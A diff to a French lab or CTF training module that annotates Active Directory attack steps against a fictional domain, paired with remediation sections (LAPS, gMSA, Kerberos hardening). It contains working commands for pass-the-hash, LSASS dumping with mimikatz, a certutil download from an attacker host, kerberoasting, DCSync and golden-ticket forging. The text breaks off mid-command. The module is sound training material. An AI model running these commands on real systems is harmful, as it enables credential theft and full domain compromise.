 # Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_ADMIN_HASH>:::
+# RID 500 = Administrateur intégré (toujours le même RID sur toutes les machines Windows)
+# Ce hash est potentiellement identique sur WS01 et FS01 (pas de LAPS)
 
-# Étape 2 : Pass-the-Hash avec wmiexec
+# Étape 2 : Pass-the-Hash avec wmiexec vers FS01
+# On utilise le hash NTLM de l'administrateur (31d6cfe0d16ae931b73c59d7e0c089c0 dans cet exemple)
+# Le LM hash vide (aad3b435b51404eeaad3b435b51404ee) indique que LM est désactivé
+# wmiexec ouvre un shell semi-interactif sur la machine distante via WMI
 impacket-wmiexec \
     -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
     CORPSHADOW/jdoe@10.10.10.20
 
 # Étape 3 : Une fois le shell obtenu, naviguer dans le système
-# C:\> whoami
-# corp-shadow\jdoe
-# C:\> hostname
-# FS01
-# C:\> type C:\Flags\flag4.txt
-# FLAG{Module10_pth_m3n4o5p6}
+# whoami   → Affiche le nom de l'utilisateur courant (vérifier les privilèges)
+# hostname → Affiche le nom de la machine (confirmer qu'on est sur FS01)
+# type     → Équivalent Windows de cat : affiche le contenu d'un fichier texte
+# On lit le flag 4 stocké dans C:\Flags\flag4.txt
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0... ...` | Obtient un shell sur FS01 via WMI en utilisant le hash NTLM de l'administrateur (Pass-the-Hash) |
+| `aad3b435b51404eeaad3b435b51404ee` | LM hash vide (valeur spéciale indiquant que l'authentification LM est désactivée) |
+| `31d6cfe0d16ae931b73c59d7e0c089c0` | NT hash NTLM (hash du mot de passe administrateur local) |
+| `whoami` | Commande Windows : affiche le nom de l'utilisateur courant |
+| `hostname` | Commande Windows : affiche le nom de la machine |
+| `type C:\Flags\flag4.txt` | Commande Windows : affiche le contenu du fichier texte (équivalent de `cat`) |
 
 **Comparaison des méthodes de mouvement latéral :**
 
@@ -682,17 +886,44 @@ impacket-wmiexec \
 #### 5.4.5 Alternative : Pass-the-Hash avec mimikatz (sur le poste Windows)
 
 ```powershell
-# Si vous avez un shell sur WS01, utiliser mimikatz
+# Si vous avez un shell sur WS01, utiliser mimikatz directement sur le poste Windows
+# Mimikatz est un outil de post-exploitation qui interagit avec LSASS en mémoire
 
-# Étape 1 : Télécharger mimikatz
+# Étape 1 : Télécharger mimikatz.exe depuis le serveur d'attaque Kali
+# certutil est un utilitaire Windows de gestion de certificats
+# -urlcache : télécharge un fichier depuis une URL (détournement de fonction)
+# -f : force le téléchargement (écrase le fichier existant)
+# === SUR KALI (terminal séparé) : servir le binaire ===
+# python3 -m http.server 8080 --directory /tmp/tools/ &
+# === SUR WINDOWS : télécharger ===
+# http://10.10.10.200/mimikatz.exe → fichier hébergé sur le serveur Kali de l'attaquant
 certutil -urlcache -f http://10.10.10.200/mimikatz.exe mimikatz.exe
 
-# Étape 2 : Dumper les hashes depuis LSASS (nécessite admin local)
+# Étape 2 : Dumper les hashes depuis la mémoire LSASS (nécessite admin local)
+# "privilege::debug" : obtient le privilège SeDebugPrivilege (nécessaire pour accéder à LSASS)
+# "sekurlsa::logonpasswords" : extrait les mots de passe et hashes de la mémoire LSASS
+# "exit" : quitte mimikatz
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
 # Étape 3 : Pass-the-Hash avec mimikatz
+# "sekurlsa::pth" : Pass-the-Hash (injecte le hash dans une session d'authentification)
+# /user:Administrator : compte cible
+# /domain:corp.shadow.local : domaine du compte
+# /ntlm:<NTLM_HASH> : hash NTLM à utiliser pour l'authentification
+# /run:powershell.exe : programme à lancer avec la session authentifiée
 .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.shadow.local /ntlm:<NTLM_HASH> /run:powershell.exe" "exit"
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `certutil -urlcache -f http://... mimikatz.exe` | Télécharge mimikatz.exe depuis Kali ; `-urlcache` = fonction de cache HTTP de certutil (détournée pour téléchargement) ; `-f` = forcer le téléchargement |
+| `.\mimikatz.exe "privilege::debug"` | Demande le privilège `SeDebugPrivilege` (nécessaire pour lire la mémoire d'autres processus comme LSASS) |
+| `"sekurlsa::logonpasswords"` | Module sekurlsa de mimikatz : extrait tous les mots de passe et hashes présents dans LSASS |
+| `"sekurlsa::pth /user:... /domain:... /ntlm:... /run:powershell.exe"` | **Pass-the-Hash** : crée une session d'authentification avec le hash NTLM fourni et lance `powershell.exe` avec cette identité |
+| `/ntlm:<NTLM_HASH>` | Hash NTLM à injecter dans l'authentification |
+| `/run:powershell.exe` | Programme à exécuter après l'injection du hash (on obtient un shell PowerShell avec les droits du compte cible) |
 
 #### 5.4.6 Flag attendu
 
@@ -704,32 +935,39 @@ FLAG{Module10_pth_m3n4o5p6}
 
 ```powershell
 # Déployer LAPS (Local Administrator Password Solution)
-# LAPS gère des mots de passe administrateur local UNIQUES pour chaque machine
+# LAPS est une solution Microsoft qui gère des mots de passe administrateur local
+# UNIQUES pour chaque machine du domaine, changés régulièrement et stockés
+# dans Active Directory (attribut ms-Mcs-AdmPwd)
+# Ainsi, même si un attaquant compromet une machine, le hash admin local
+# n'est pas réutilisable sur les autres machines
 
-# 1. Installer LAPS sur le domaine
-# Télécharger depuis Microsoft : https://www.microsoft.com/en-us/download/details.aspx?id=46899
+# 1. Installer LAPS sur le domaine (téléchargement préalable requis)
+# L'installateur modifie le schéma AD et ajoute les outils d'administration
 
-# 2. Étendre le schéma AD
+# 2. Étendre le schéma AD pour ajouter les attributs LAPS
+# Import-Module AdmPwd.PS : charge le module PowerShell LAPS
+# Update-AdmPwdADSchema : étend le schéma AD avec les classes et attributs LAPS
 Import-Module AdmPwd.PS
 Update-AdmPwdADSchema
 
-# 3. Déléguer les droits
+# 3. Déléguer les droits aux ordinateurs pour qu'ils puissent écrire leur mot de passe
+# Set-AdmPwdComputerSelfPermission : permet aux ordinateurs d'une OU donnée
+# de mettre à jour leur propre attribut ms-Mcs-AdmPwd dans AD
 Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=corp,DC=shadow,DC=local"
 
-# 4. Déployer le client LAPS sur toutes les machines via GPO
-
-# 5. Configurer la GPO LAPS
-# Configuration ordinateur > Modèles d'administration
-# > LAPS > Configurer le service LAPS
-
-# Vérifier le déploiement :
+# Vérifier le déploiement sur une machine :
+# Get-ItemProperty lit la valeur registre confirmant que la GPO LAPS est appliquée
 Get-ItemProperty "HKLM:\Software\Policies\Microsoft Services\AdmPwd"
-
-# Autres mesures :
-# - Activer le filtrage des adresses IP pour l'administration à distance
-# - Restreindre l'accès à SMB et RDP aux seules machines autorisées
-# - Utiliser JEA (Just Enough Administration) pour restreindre les commandes
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `Import-Module AdmPwd.PS` | Charge le module PowerShell LAPS (AdmPwd = Administrator Password) pour la gestion des mots de passe administrateur local |
+| `Update-AdmPwdADSchema` | Étend le schéma AD avec les nouveaux attributs LAPS (ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime) |
+| `Set-AdmPwdComputerSelfPermission -OrgUnit "OU=..."` | Délègue aux ordinateurs de l'OU le droit d'écrire leur propre mot de passe LAPS dans AD |
+| `Get-ItemProperty "HKLM:\...\AdmPwd"` | Vérifie que la GPO LAPS est bien appliquée sur la machine locale |
 
 ---
 
@@ -777,84 +1015,139 @@ Get-ItemProperty "HKLM:\Software\Policies\Microsoft Services\AdmPwd"
 #### 5.5.3 Commande
 
 ```bash
-# Étape 1 : Lister les SPNs du domaine
+# Étape 1 : Lister les SPNs (Service Principal Names) du domaine
+# impacket-GetUserSPNs interroge le contrôleur de domaine via LDAP pour trouver
+# tous les comptes utilisateur possédant un SPN (Service Principal Name)
+# Un SPN est l'identifiant unique d'un service dans Kerberos (ex: FS01/corp.shadow.local)
+# Les comptes avec SPN sont potentiellement kerberoastables
 impacket-GetUserSPNs \
     CORPSHADOW/jdoe:'P@ssw0rd!2025' \
     -dc-ip 10.10.10.10
+```
 
-# Décomposition :
-#   CORPSHADOW/jdoe:'P@ssw0rd!2025'
-#           Compte de domaine avec mot de passe
-#   -dc-ip 10.10.10.10
-#           Adresse IP du contrôleur de domaine
+**Explication des commandes :**
 
-# Étape 2 : Demander et exporter les TGS
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-GetUserSPNs` | Outil Impacket qui liste les comptes utilisateur avec SPN (Service Principal Name) via LDAP |
+| `CORPSHADOW/jdoe:'P@ssw0rd!2025'` | Authentification avec le compte de domaine `jdoe` (compte standard, pas besoin d'admin) |
+| `-dc-ip 10.10.10.10` | **Domain Controller IP** : adresse IP du contrôleur de domaine (DC01) pour la requête LDAP/Kerberos |
+
+```bash
+# Étape 2 : Demander et exporter les tickets TGS (Ticket-Granting Service)
+# -request : demande au KDC (Key Distribution Center) de délivrer un TGS
+#           pour chaque SPN trouvé. Le TGS est chiffré avec le hash du mot de passe
+#           du compte de service cible.
+# -outputfile : sauvegarde les tickets TGS dans un fichier pour crack ultérieur
 impacket-GetUserSPNs \
     CORPSHADOW/jdoe:'P@ssw0rd!2025' \
     -dc-ip 10.10.10.10 \
     -request \
     -outputfile /tmp/kerberoast_tgs.txt
-
-# Options supplémentaires :
-#   -request     : Demander les tickets TGS
-#   -outputfile  : Sauvegarder les tickets dans un fichier
-#   -target-domain : Si confiance inter-domaine
 ```
+
+**Explication des options supplémentaires :**
+
+| Option | Rôle/Explication |
+|--------|------------------|
+| `-request` | Demande un TGS pour chaque SPN trouvé ; le TGS est chiffré avec le hash NTLM du compte de service (c'est ce ticket qu'on va cracker) |
+| `-outputfile /tmp/kerberoast_tgs.txt` | Sauvegarde les tickets TGS dans le fichier spécifié pour l'attaque hors ligne |
+| `-target-domain` | Option facultative pour cibler un domaine de confiance différent (inter-domaine) |
 
 #### 5.5.4 Exécution
 
 ```bash
-# Étape 1 : Lister les SPNs
+# Étape 1 : Lister les SPNs du domaine
+# La commande interroge le DC et affiche tous les comptes avec SPN
 impacket-GetUserSPNs \
     CORPSHADOW/jdoe:'P@ssw0rd!2025' \
     -dc-ip 10.10.10.10
+```
 
-# Output attendu :
-# ServicePrincipalName              Name          MemberOf  PasswordLastSet      Email
-# --------------------------------  ------------  --------  ------------------  -----
-# FS01/corp.shadow.local            svc_backup              2024-12-01 10:00:00
-# DC01/sql.corp.shadow.local        svc_sql                 2024-11-15 14:30:00
+**Explication des commandes :**
 
-# Étape 2 : Demander le TGS pour svc_backup
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-GetUserSPNs CORPSHADOW/jdoe:'P@ssw0rd!2025' -dc-ip 10.10.10.10` | Liste les SPN du domaine ; les colonnes affichées sont : SPN, nom du compte, groupe, date du dernier changement de mot de passe |
+
+```text
+Output attendu :
+ServicePrincipalName              Name          MemberOf  PasswordLastSet      Email
+-------------------------------  ------------  --------  ------------------  -----
+FS01/corp.shadow.local            svc_backup              2024-12-01 10:00:00
+DC01/sql.corp.shadow.local        svc_sql                 2024-11-15 14:30:00
+→ Deux comptes kerberoastables : svc_backup (sur FS01) et svc_sql (sur DC01)
+→ PasswordLastSet ancien → mot de passe probablement non changé depuis longtemps
+```
+
+```bash
+# Étape 2 : Demander le TGS pour les SPNs trouvés
+# Le KDC (DC01) délivre un TGS chiffré avec le hash NTLM du compte de service
+# Le ticket est stocké dans /tmp/kerberoast_tgs.txt pour crack
 impacket-GetUserSPNs \
     CORPSHADOW/jdoe:'P@ssw0rd!2025' \
     -dc-ip 10.10.10.10 \
     -request \
     -outputfile /tmp/kerberoast_tgs.txt
+```
 
-# Output attendu :
-# [*] Requesting tickets for SPNs...
-# [*] Saving TGS in /tmp/kerberoast_tgs.txt
-# $krb5tgs$23$*svc_backup$CORP.SHADOW.LOCAL$CORP.SHADOW.LOCAL/svc_backup*$1234567890abcdef1234567890abcdef$abcdef1234567890abcdef1234567890abcdef12345678
+```text
+Output attendu :
+[*] Requesting tickets for SPNs...           → Demande de TGS en cours
+[*] Saving TGS in /tmp/kerberoast_tgs.txt    → Ticket sauvegardé
+$krb5tgs$23$*svc_backup$CORP.SHADOW.LOCAL... → Ticket TGS au format hashcat/john
+  → $krb5tgs$23$ = en-tête du hash (Kerberos 5 TGS, etype 23 = RC4-HMAC)
+  → svc_backup = nom du compte de service
+  → CORP.SHADOW.LOCAL = domaine en majuscules
+```
 
-# Étape 3 : Analyser le fichier
+```bash
+# Étape 3 : Analyser le fichier de ticket
+# cat affiche le contenu du fichier (le hash du TGS à cracker)
 cat /tmp/kerberoast_tgs.txt
 ```
 
 **Cracker le TGS avec john :**
 
 ```bash
-# Méthode 1 : Avec john et rockyou
+# Méthode 1 : Avec john the ripper et la wordlist rockyou
+# john essaie chaque mot du dictionnaire comme mot de passe
+# pour déchiffrer le TGS. Si le TGS se déchiffre avec un mot,
+# c'est que ce mot est le mot de passe du compte de service.
 john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast_tgs.txt
 
-# Méthode 2 : Avec hashcat (si GPU)
+# Méthode 2 : Avec hashcat (beaucoup plus rapide si GPU disponible)
+# -m 13100 : mode hash = Kerberos 5 TGS-REP (etype 23 = RC4-HMAC)
+# --force : ignorer les avertissements de compatibilité OpenCL
 hashcat -m 13100 /tmp/kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt --force
-# -m 13100 : mode Kerberos 5 TGS-REP (etype 23)
 
 # Étape 4 : Afficher le mot de passe cracké
+# john --show liste tous les mots de passe crackés dans le fichier
 john --show /tmp/kerberoast_tgs.txt
 # Output attendu :
 # svc_backup:SvcB@ckup#2025
+# → Mot de passe du compte de service svc_backup = SvcB@ckup#2025
 ```
 
 **Cracker le TGS avec un script dédié (tgsrepcrack) :**
 
 ```bash
-# Alternative : tgsrepcrack.py (nécessite kerberoast toolkit)
+# Alternative : tgsrepcrack.py fait partie du toolkit kerberoast
+# Il prend en entrée la wordlist et le fichier de tickets TGS
+# Avantage : permet de cracker spécifiquement les tickets Kerberos
 python3 /opt/kerberoast/tgsrepcrack.py \
     /usr/share/wordlists/rockyou.txt \
     /tmp/kerberoast_tgs.txt
 ```
+
+**Explication des commandes de crack :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast_tgs.txt` | **John the Ripper** : craque le TGS par dictionnaire ; `rockyou.txt` contient les mots de passe les plus courants |
+| `hashcat -m 13100 ... --force` | **Hashcat** : craque par GPU ; `-m 13100` = mode Kerberos 5 TGS-REP (etype 23, RC4-HMAC) ; `--force` = ignorer les avertissements |
+| `python3 /opt/kerberoast/tgsrepcrack.py rockyou.txt tgs.txt` | Script spécialisé du toolkit kerberoast pour cracker les TGS |
+| `john --show /tmp/kerberoast_tgs.txt` | Affiche le résultat du crack : utilisateur:mot_de_passe |
 
 #### 5.5.5 Flag attendu
 
@@ -866,46 +1159,65 @@ FLAG{Module10_kerberoast_q7r8s9t0}
 
 ```powershell
 # 1. Utiliser des comptes gMSA (Group Managed Service Account)
-# Les gMSA ont des mots de passe automatiques changés régulièrement
+# Les gMSA sont des comptes de service dont le mot de passe est géré automatiquement
+# par le contrôleur de domaine (changé régulièrement, 30 caractères aléatoires)
+# Ils éliminent le besoin de stocker et gérer manuellement des mots de passe
 
-# Créer un gMSA
+# Créer un nouveau compte gMSA
+# New-ADServiceAccount crée un compte de service géré dans AD
+# -Name : nom du compte (sans le $
+# -DNSHostName : nom DNS du serveur hôte
+# -Enabled $true : active le compte
+# -ServicePrincipalNames : SPN associé au compte
 New-ADServiceAccount `
     -Name "gmsa_backup" `
     -DNSHostName "FS01.corp.shadow.local" `
     -Enabled $true `
     -ServicePrincipalNames "FS01/corp.shadow.local"
 
-# Installer le gMSA sur le serveur
+# Installer le gMSA sur le serveur cible (FS01)
+# Install-ADServiceAccount installe le compte sur la machine locale
+# pour qu'il puisse être utilisé par les services
 Install-ADServiceAccount -Identity "gmsa_backup"
 
-# 2. Pour les comptes de service classiques :
-#    - Mot de passe d'au moins 30 caractères (généré aléatoirement)
-#    - Changement obligatoire tous les 30 jours
-#    - Activer "User must change password at next logon"
+# 2. Pour les comptes de service classiques non gMSA :
+# Désactiver l'option "PasswordNeverExpires" pour forcer les changements réguliers
+# Set-ADUser modifie les propriétés d'un utilisateur AD
+# -PasswordNeverExpires $false : le mot de passe doit expirer (rotation obligatoire)
 Set-ADUser -Identity svc_backup -PasswordNeverExpires $false
 
-# 3. Surveiller les requêtes Kerberos anormales (trop de TGS requests)
-# Active Directory Event ID 4769 (TGS request)
-# Rechercher : plusieurs TGS requests pour le même SPN par le même utilisateur
-
-# 4. Activer l'audit Kerberos avancé
+# 3. Activer l'audit Kerberos avancé pour détecter les attaques Kerberoasting
+# auditpol configure les politiques d'audit Windows
+# /set : définit une politique
+# /subcategory:"Kerberos Service Ticket Operations" : catégorie des tickets Kerberos
+# /success:enable : audite les succès (toute demande de TGS sera loggée)
 auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable
 
-# 5. Utiliser des SPN en AES256 plutôt que RC4
-# Vérifier le type de chiffrement supporté :
+# 4. Vérifier et configurer les types de chiffrement supportés par le compte de service
+# Get-ADUser lit les propriétés de l'utilisateur AD
+# -Properties msDS-SupportedEncryptionTypes : type de chiffrement Kerberos
 Get-ADUser -Identity svc_backup -Properties msDS-SupportedEncryptionTypes
-# Valeur recommandée : 24 (AES128 + AES256)
-#   1  = DES-CBC-CRC
-#   2  = DES-CBC-MD5
-#   4  = RC4-HMAC
-#   8  = AES128-CTS-HMAC-SHA1-96
-#   16 = AES256-CTS-HMAC-SHA1-96
-#   24 = AES128 + AES256 (recommandé)
 
+# Forcer l'utilisation d'AES256 plutôt que RC4 (vulnérable au Kerberoasting)
+# Set-ADUser -Replace remplace la valeur de l'attribut
+# "msDS-SupportedEncryptionTypes" = 24 signifie AES128 + AES256 activés
+# Cela rend le Kerberoasting beaucoup plus difficile (casser AES256 est
+# exponentiellement plus coûteux que RC4)
 Set-ADUser -Identity svc_backup -Replace @{
     "msDS-SupportedEncryptionTypes" = 24
 }
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `New-ADServiceAccount -Name "gmsa_backup" -DNSHostName "FS01..." -Enabled $true -SPN "..."` | Crée un compte de service géré (gMSA) avec mot de passe automatique |
+| `Install-ADServiceAccount -Identity "gmsa_backup"` | Installe le gMSA sur le serveur local pour utilisation par les services Windows |
+| `Set-ADUser -Identity svc_backup -PasswordNeverExpires $false` | Force l'expiration du mot de passe du compte de service (rotation obligatoire) |
+| `auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable` | Active l'audit des demandes de TGS Kerberos (événement 4769) pour détecter le Kerberoasting |
+| `Get-ADUser ... msDS-SupportedEncryptionTypes` | Lit les types de chiffrement supportés par le compte (DES, RC4, AES128, AES256) |
+| `Set-ADUser -Replace @{"msDS-SupportedEncryptionTypes" = 24}` | Configure AES128 + AES256 seulement (désactive RC4 = empêche le Kerberoasting efficace) |
 
 ---
 
@@ -954,144 +1266,232 @@ Une fois le hash du compte **KRBTGT** récupéré via DCSync, on peut forger un 
 
 ```bash
 # Étape 1 : DCSync — extraire tous les hashes du domaine
+# impacket-secretsdump avec -just-dc utilise le protocole DRSUAPI (Directory Replication Service)
+# pour simuler la réplication entre contrôleurs de domaine
+# Il demande les attributs unicodePwd et supplementalCredentials de tous les objets
+# du domaine, ce qui permet de récupérer les hash NTLM de TOUS les comptes
+# Condition : le compte utilisé doit avoir les droits de réplication DS
+# (Administrator du domaine possède ces droits par défaut)
 impacket-secretsdump \
     CORPSHADOW/Administrator@10.10.10.10 \
     -just-dc
-
-# Décomposition :
-#   CORPSHADOW/Administrator@10.10.10.10
-#           Compte admin (obtenu via escalade précédente)
-#   -just-dc : Extraire uniquement les données du DC (NTDS.dit)
 ```
+
+**Explication des commandes :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-secretsdump` | Extrait les hashes via SMB (SAM distant) ou DRSUAPI (DCSync) |
+| `CORPSHADOW/Administrator@10.10.10.10` | Compte administrateur du domaine visant le contrôleur de domaine (DC01) |
+| `-just-dc` | Mode DCSync : utilise DRSUAPI pour répliquer NTDS.dit (la base AD) et extraire tous les hashes du domaine |
 
 **Variantes :**
 
 ```bash
-# Extraire uniquement le hash KRBTGT
+# Extraire uniquement le hash du compte KRBTGT (nécessaire pour le Golden Ticket)
+# grep filtre la sortie pour ne garder que la ligne contenant "krbtgt"
+# Le KRBTGT est le compte utilisé par le KDC pour chiffrer TOUS les TGT du domaine
 impacket-secretsdump \
     CORPSHADOW/Administrator@10.10.10.10 \
     -just-dc \
     | grep krbtgt
 
-# Extraire le hash d'un utilisateur spécifique
+# Extraire le hash d'un utilisateur spécifique uniquement
+# -just-dc-user : limite l'extraction à un seul utilisateur (plus rapide, moins de bruit)
 impacket-secretsdump \
     CORPSHADOW/Administrator@10.10.10.10 \
     -just-dc-user jdoe
 
-# Utiliser Pass-the-Hash pour DCSync (si on a le hash de l'admin)
+# Utiliser Pass-the-Hash pour DCSync
+# Si on a le hash NTLM de l'admin mais pas son mot de passe,
+# on utilise -hashes :<NTLM_ADMIN_HASH> pour s'authentifier
 impacket-secretsdump \
     -hashes :<NTLM_ADMIN_HASH> \
     CORPSHADOW/Administrator@10.10.10.10 \
     -just-dc
 ```
 
+**Explication des variantes :**
+
+| Option | Rôle/Explication |
+|--------|------------------|
+| `\| grep krbtgt` | Pipeline : filtre la sortie pour ne conserver que la ligne contenant "krbtgt" (le compte cible pour le Golden Ticket) |
+| `-just-dc-user jdoe` | Limite l'extraction DCSync à un seul utilisateur (utile pour cibler un compte spécifique sans tout extraire) |
+| `-hashes :<NTLM_ADMIN_HASH>` | Authentification par hash NTLM (Pass-the-Hash) au lieu du mot de passe en clair |
+
 #### 5.6.4 Commande Golden Ticket
 
 ```bash
 # Étape 2 : Forger un Golden Ticket avec impacket-ticketer
+# impacket-ticketer crée un TGT (Ticket-Granting Ticket) forgé
+# (falsifié) en utilisant le hash NTLM du compte KRBTGT
+# Le KRBTGT est le compte qui CHIFFRE tous les TGT du domaine.
+# Avec son hash, on peut créer un TGT valide pour N'IMPORTE QUEL utilisateur,
+# avec N'IMPORTE QUELS privilèges (groupes), pour une durée arbitraire
 impacket-ticketer \
     -nthash <KRBTGT_NT_HASH> \
     -domain-sid <DOMAIN_SID> \
     -domain corp.shadow.local \
     -groups 512,519,518 \
     Administrator
+```
 
-# Décomposition :
-#   -nthash <KRBTGT_NT_HASH>
-#           Hash NTLM du compte KRBTGT (récupéré via DCSync)
-#   -domain-sid <DOMAIN_SID>
-#           SID du domaine (ex: S-1-5-21-1234567890-1234567890-1234567890)
-#           Récupérable via : `impacket-lookupsid CORPSHADOW/jdoe@10.10.10.10`
-#   -domain corp.shadow.local
-#           Nom du domaine
-#   -groups 512,519,518
-#           RIDs des groupes :
-#           512 = Administrateurs du domaine
-#           518 = Admins du schéma
-#           519 = Admins d'entreprise
-#   Administrator
-#           Nom d'utilisateur pour lequel le ticket est forgé
+**Explication des commandes :**
 
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-ticketer` | Outil Impacket qui forge des tickets Kerberos (TGT) avec le hash KRBTGT |
+| `-nthash <KRBTGT_NT_HASH>` | **NT Hash** : hash NTLM du compte KRBTGT (récupéré via DCSync) ; c'est la clé qui permet de signer le TGT |
+| `-domain-sid <DOMAIN_SID>` | **Domain SID** : Security Identifier du domaine (ex: S-1-5-21-...) ; nécessaire pour construire les RIDs des groupes |
+| `-domain corp.shadow.local` | Nom de domaine complet (FQDN) pour lequel le ticket est valide |
+| `-groups 512,519,518` | RIDs (Relative Identifiers) des groupes AD : |
+| | `512` = **Domain Admins** (accès complet à tout le domaine) |
+| | `518` = **Schema Admins** (peut modifier le schéma AD) |
+| | `519` = **Enterprise Admins** (accès à toute la forêt) |
+| `Administrator` | Nom d'utilisateur pour lequel le ticket est forgé (peut être n'importe quel nom, même inexistant) |
+
+```bash
 # Étape 3 : Exporter le ticket dans la session courante
+# export KRB5CCNAME définit la variable d'environnement pointant vers le fichier de cache Kerberos
+# Linux utilise cette variable pour trouver le ticket Kerberos lors des authentifications
 export KRB5CCNAME=/tmp/administrator.ccache
 
-# Étape 4 : Utiliser le ticket (ex: accès SMB au DC)
+# Étape 4 : Utiliser le ticket forgé pour un accès SMB au DC
+# impacket-smbexec avec -k utilise l'authentification Kerberos
+# -no-pass : aucun mot de passe nécessaire (l'authentification se fait via le ticket)
+# Le ticket forgé (TGT) est utilisé pour demander un TGS pour le service SMB sur DC01
 impacket-smbexec \
     -k \
     -no-pass \
     CORPSHADOW/Administrator@DC01.corp.shadow.local
-
-# -k        : Utiliser l'authentification Kerberos (via le ticket cache)
-# -no-pass  : Pas de mot de passe (on utilise le ticket)
 ```
+
+**Explication des options Golden Ticket :**
+
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `export KRB5CCNAME=/tmp/administrator.ccache` | Variable d'environnement pointant vers le fichier cache Kerberos (`KRB5CCNAME`) ; `export` la rend disponible aux processus enfants |
+| `impacket-smbexec -k -no-pass ...` | **SMB Exec** avec `-k` (Kerberos) et `-no-pass` (pas de mot de passe, utilise le ticket) |
+| `-k` | **Kerberos** : force l'utilisation de l'authentification Kerberos plutôt que NTLM |
+| `-no-pass` | **No password** : n'envoie pas de mot de passe pour l'authentification (utilise le ticket cache) |
+| `DC01.corp.shadow.local` | Nom DNS complet du contrôleur de domaine (doit correspondre au SPN enregistré) |
 
 #### 5.6.5 Exécution complète
 
 ```bash
-# Étape 1 : Récupérer le SID du domaine
+# Étape 1 : Récupérer le SID du domaine (nécessaire pour forger le Golden Ticket)
+# impacket-lookupsid interroge le DC via SAMR (Security Account Manager Remote)
+# pour lister les utilisateurs et groupes, et en déduire le SID du domaine
+# grep filtre pour n'afficher que la ligne contenant "Domain SID"
+# Le SID est au format S-1-5-21-<valeur numérique>
 impacket-lookupsid \
     CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10 \
     | grep "Domain SID"
+```
 
-# Output attendu :
-# Domain SID: S-1-5-21-1234567890-1234567890-1234567890
+**Explication des commandes :**
 
-# Étape 2 : DCSync
+| Commande/Option | Rôle/Explication |
+|----------------|------------------|
+| `impacket-lookupsid CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.10` | Outil Impacket qui liste les SID des utilisateurs/groupes ; le pipeline `\| grep` filtre pour ne garder que le SID du domaine |
+| `\| grep "Domain SID"` | **Grep** : filtre la sortie pour ne conserver que la ligne contenant "Domain SID" |
+
+```text
+Output attendu :
+Domain SID: S-1-5-21-1234567890-1234567890-1234567890
+```
+
+```bash
+# Étape 2 : DCSync — extraire tous les hashes du domaine depuis NTDS.dit
+# Utilise DRSUAPI pour répliquer les données AD (simule un DC secondaire)
+# Extrait les hash NTLM de TOUS les comptes du domaine
 impacket-secretsdump \
     CORPSHADOW/Administrator@10.10.10.10 \
     -just-dc
+```
 
-# Output attendu (extrait) :
-# [*] Dumping Domain Credentials (domain:uid:rid:lmhash:nthash)
-# [*] Using the DRSUAPI to get NTDS secrets
-# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT_HASH>:::
-# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NT_HASH>:::
-# CORPSHADOW\jdoe:1001:aad3b435b51404eeaad3b435b51404ee:<JDOE_NT_HASH>:::
-# CORPSHADOW\svc_backup:1002:aad3b435b51404eeaad3b435b51404ee:<SVC_BACKUP_HASH>:::
-# CORPSHADOW\svc_sql:1003:aad3b435b51404eeaad3b435b51404ee:<SVC_SQL_HASH>:::
-# ...
-# [*] Dumping Kerberos keys (krbtgt)
-# krbtgt:aes256-cts-hmac-sha1-96:<AES256_KEY>
-# krbtgt:aes128-cts-hmac-sha1-96:<AES128_KEY>
+```text
+Output attendu (extrait) :
+[*] Dumping Domain Credentials (domain:uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI to get NTDS secrets   → Utilisation de l'API DRSUAPI
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_NT_HASH>:::
+              → RID 500 = Admin domaine
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NT_HASH>:::
+              → RID 502 = Compte KRBTGT (celui qui chiffre les TGT)
+CORPSHADOW\jdoe:1001:...:<JDOE_NT_HASH>:::
+CORPSHADOW\svc_backup:1002:...:<SVC_BACKUP_HASH>:::
+CORPSHADOW\svc_sql:1003:...:<SVC_SQL_HASH>:::
+...
+[*] Dumping Kerberos keys (krbtgt)
+krbtgt:aes256-cts-hmac-sha1-96:<AES256_KEY>  → Clé AES256 du KRBTGT
+krbtgt:aes128-cts-hmac-sha1-96:<AES128_KEY>  → Clé AES128 du KRBTGT
+```
 
-# Étape 3 : Forger le Golden Ticket
+```bash
+# Étape 3 : Forger le Golden Ticket avec le hash KRBTGT et le SID du domaine
+# On stocke les valeurs dans des variables pour faciliter l'écriture
 KRBTGT_HASH="<KRBTGT_NT_HASH>"
 DOMAIN_SID="S-1-5-21-1234567890-1234567890-1234567890"
 
+# impacket-ticketer crée un TGT forgé (non valide mais accepté car signé avec KRBTGT)
+# Le ticket donne les droits des groupes 512 (Domain Admins), 518 (Schema Admins),
+# 519 (Enterprise Admins) pour l'utilisateur Administrator
 impacket-ticketer \
